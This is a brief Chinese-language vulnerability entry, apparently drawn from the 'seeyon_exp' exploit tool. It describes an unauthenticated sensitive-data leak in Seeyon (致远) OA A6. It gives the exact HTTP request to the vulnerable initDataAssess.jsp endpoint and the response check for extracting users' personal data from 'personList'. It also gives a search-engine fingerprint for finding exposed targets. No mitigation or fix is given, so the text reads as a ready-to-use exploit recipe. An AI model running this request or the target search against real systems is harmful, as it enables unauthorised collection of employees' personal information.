---
source: "Summer177/seeyon_exp"
---

# 致远OA A6 initDataAssess.jsp 敏感信息泄露漏洞

## 漏洞描述

致远OA A6 的 `/yyoa/assess/js/initDataAssess.jsp` 接口未授权即可访问，响应中直接返回包含用户敏感信息的 `personList` 数据，造成用户信息泄露。

## 漏洞复现

```
GET /yyoa/assess/js/initDataAssess.jsp HTTP/1.1
Host: target
```

响应状态码为 200，且响应体中包含 `personList` 即存在漏洞，可从中提取用户敏感信息。

## 网络测绘

```
app="致远互联-OA"
```

## 参考链接

- 利用细节依据 Summer177/seeyon_exp 工具 `poc/information.py` 中 `initDataAssess` 函数的检测逻辑。
